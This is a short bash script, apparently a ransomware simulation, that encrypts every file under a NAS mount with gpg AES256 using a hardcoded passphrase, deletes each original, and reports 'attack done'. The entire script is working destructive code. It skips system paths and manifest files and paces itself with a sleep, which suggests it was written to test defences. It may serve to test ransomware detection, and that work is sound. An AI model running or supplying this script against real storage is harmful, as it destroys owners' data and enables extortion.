#!/bin/bash

TARGET="/mnt/nas"
PASS="test1234"

find "$TARGET" -type f -not -path '*/@*' -not -name '_manifest.*' -print0 \
| xargs -0 -P 1 -I {} bash -c '
    gpg --batch --yes --passphrase "'"$PASS"'" -c --cipher-algo AES256 "{}" && rm -f "{}"
    sleep 0.7
  '
echo "attack done: $(date +%T)"
